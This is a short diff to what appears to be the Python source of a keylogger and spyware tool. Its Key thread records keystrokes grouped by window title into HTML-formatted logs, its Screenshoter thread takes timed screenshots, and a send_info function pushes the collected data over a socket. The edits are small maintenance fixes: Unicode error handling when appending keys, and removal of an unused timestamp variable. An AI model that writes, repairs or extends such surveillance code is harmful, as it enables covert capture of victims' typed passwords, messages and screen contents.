@@ -272,7 +272,10 @@ class Key(threading.Thread):
         new_window_title = get_window_title()
 
         if CURRENT_WINDOW_TITLE == new_window_title:
-            KEY_LOGS['logs'] += log.encode('utf-8')
+            try:
+                KEY_LOGS['logs'] += log.encode('utf-8')
+            except UnicodeDecodeError:
+                KEY_LOGS['logs'] += '<font color="red">{UnicodeError}</font>'
         else:
             if KEY_LOGS.has_key('logs'):
                 KEY_LOGS['logs'] += '<br><p align="center" style="background-color: #34495e;color: #ecf0f1;"><font color="#e67e22">[%s] </font>' % get_date_time() + new_window_title + '</p><br>' + log.encode('utf-8')
@@ -322,7 +325,6 @@ class Screenshoter(threading.Thread):
             config = init()
             if config['sts']:
                 delay = config['std']
-                now = datetime.datetime.now()
                 SCREENSHOT_LOGS[get_date_time()] = {
                     'screen_bits': screen_bits(),
                     'title_name': get_window_title(),
@@ -472,6 +474,7 @@ def send_info(sock):
             time.sleep(5)
         except socket.error:
             ACTIVE = False
+
 
 def reactor():
     global ACTIVE
